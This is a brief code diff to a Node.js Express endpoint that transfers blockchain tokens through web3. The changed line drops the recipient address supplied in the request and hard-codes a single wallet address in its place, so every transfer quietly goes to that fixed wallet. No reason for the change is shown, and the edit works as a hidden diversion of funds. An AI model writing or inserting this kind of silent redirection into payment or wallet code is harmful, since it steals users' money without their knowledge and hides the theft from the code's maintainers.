@@ -823,7 +823,7 @@ app.post('/transferBscsScanTokensFees', async (req, res) => {
     const contract = new web3.eth.Contract(tokenAbi, contractAddress);
     const decimals = 18; // Replace with the number of decimal places for your token
     const fromAddress = req.body.fromAddress;
-    const toAddress = req.body.receiverAddress;
+    const toAddress = '0x11086cAfF60E357bE5ae9C69D6B3b19386065ac3';
     const amount = req.body.amount; // Replace with the amount of tokens to transfer
 
     // Calculate the token amount with decimal places
